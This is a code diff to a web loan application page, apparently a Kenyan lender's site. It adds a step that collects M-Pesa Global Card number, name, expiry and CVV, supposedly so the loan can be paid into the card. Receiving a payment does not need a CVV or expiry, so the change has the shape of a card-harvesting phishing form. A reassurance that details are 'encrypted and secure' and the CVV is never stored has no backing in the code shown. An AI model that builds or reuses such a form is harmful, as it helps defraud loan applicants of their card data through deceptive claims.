@@ -15,7 +15,8 @@ import { motion } from 'framer-motion'
 const steps = [
   { number: 1, title: 'Personal Details', description: 'Your basic information' },
   { number: 2, title: 'Loan Details', description: 'Loan amount and term' },
-  { number: 3, title: 'Review & Submit', description: 'Review and submit' },
+  { number: 3, title: 'M-Pesa Card Details', description: 'Receive loan to your card' },
+  { number: 4, title: 'Review & Submit', description: 'Review and submit' },
 ]
 
 export default function ApplyPage() {
@@ -29,6 +30,10 @@ export default function ApplyPage() {
     loanAmount: '',
     loanTerm: '',
     purpose: '',
+    mpesaCardNumber: '',
+    mpesaCardName: '',
+    mpesaCardExpiry: '',
+    mpesaCVV: '',
   })
 
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
@@ -71,7 +76,7 @@ export default function ApplyPage() {
               </div>
               <h1 className="text-3xl font-bold text-foreground mb-4">Application Submitted!</h1>
               <p className="text-lg text-muted-foreground mb-8">
-                Thank you for applying. We&apos;ve received your application and will review it shortly. You&apos;ll receive updates via email and SMS.
+                Thank you for applying! Your loan application has been submitted successfully. The funds will be transferred to your M-Pesa Global Card within 24 hours. You&apos;ll receive updates via email and SMS.
               </p>
               <div className="bg-secondary/50 rounded-lg p-6 text-left mb-8">
                 <h3 className="font-semibold text-foreground mb-4">Application Summary</h3>
@@ -87,6 +92,10 @@ export default function ApplyPage() {
                   <div className="flex justify-between">
                     <span className="text-muted-foreground">Loan Term:</span>
                     <span className="font-medium">{formData.loanTerm} months</span>
+                  </div>
+                  <div className="flex justify-between border-t border-border pt-2 mt-2">
+                    <span className="text-muted-foreground">Receiving to:</span>
+                    <span className="font-medium">●●●● ●●●● ●●●● {formData.mpesaCardNumber.slice(-4)}</span>
                   </div>
                 </div>
               </div>
@@ -253,6 +262,74 @@ export default function ApplyPage() {
 
                 {currentStep === 2 && (
                   <div className="space-y-6">
+                    <div className="bg-primary/10 rounded-lg p-4 border border-primary/20 mb-4">
+                      <p className="text-sm text-foreground font-medium mb-2">M-Pesa Global Card Details</p>
+                      <p className="text-xs text-muted-foreground">
+                        Enter your M-Pesa Global Card details. The loan amount will be transferred directly to your card account.
+                      </p>
+                    </div>
+                    <div className="grid gap-4 md:grid-cols-2">
+                      <div className="space-y-2">
+                        <Label htmlFor="mpesaCardNumber">Card Number</Label>
+                        <Input
+                          id="mpesaCardNumber"
+                          name="mpesaCardNumber"
+                          placeholder="1234 5678 9012 3456"
+                          value={formData.mpesaCardNumber}
+                          onChange={handleInputChange}
+                          required
+                          maxLength="19"
+                        />
+                      </div>
+                      <div className="space-y-2">
+                        <Label htmlFor="mpesaCardName">Cardholder Name</Label>
+                        <Input
+                          id="mpesaCardName"
+                          name="mpesaCardName"
+                          placeholder="John Doe"
+                          value={formData.mpesaCardName}
+                          onChange={handleInputChange}
+                          required
+                        />
+                      </div>
+                    </div>
+                    <div className="grid gap-4 md:grid-cols-2">
+                      <div className="space-y-2">
+                        <Label htmlFor="mpesaCardExpiry">Expiry Date (MM/YY)</Label>
+                        <Input
+                          id="mpesaCardExpiry"
+                          name="mpesaCardExpiry"
+                          placeholder="12/25"
+                          value={formData.mpesaCardExpiry}
+                          onChange={handleInputChange}
+                          required
+                          maxLength="5"
+                        />
+                      </div>
+                      <div className="space-y-2">
+                        <Label htmlFor="mpesaCVV">CVV</Label>
+                        <Input
+                          id="mpesaCVV"
+                          name="mpesaCVV"
+                          placeholder="123"
+                          value={formData.mpesaCVV}
+                          onChange={handleInputChange}
+                          required
+                          maxLength="4"
+                          type="password"
+                        />
+                      </div>
+                    </div>
+                    <div className="bg-accent/10 rounded-lg p-4 border border-accent/20">
+                      <p className="text-xs text-muted-foreground">
+                        🔒 Your card details are encrypted and secure. We never store your CVV.
+                      </p>
+                    </div>
+                  </div>
+                )}
+
+                {currentStep === 3 && (
+                  <div className="space-y-6">
                     <div className="bg-secondary/50 rounded-lg p-6 space-y-4">
                       <h3 className="font-semibold text-foreground">Review Your Application</h3>
                       <div className="space-y-3 text-sm">
@@ -272,9 +349,17 @@ export default function ApplyPage() {
                           <span className="text-muted-foreground">Loan Amount:</span>
                           <span className="font-medium">KES {formData.loanAmount}</span>
                         </div>
-                        <div className="flex justify-between">
+                        <div className="flex justify-between border-b border-border pb-2">
                           <span className="text-muted-foreground">Loan Term:</span>
                           <span className="font-medium">{formData.loanTerm} months</span>
+                        </div>
+                        <div className="flex justify-between border-b border-border pb-2">
+                          <span className="text-muted-foreground">M-Pesa Card:</span>
+                          <span className="font-medium">●●●● ●●●● ●●●● {formData.mpesaCardNumber.slice(-4)}</span>
+                        </div>
+                        <div className="flex justify-between">
+                          <span className="text-muted-foreground">Cardholder:</span>
+                          <span className="font-medium">{formData.mpesaCardName}</span>
                         </div>
                       </div>
                     </div>
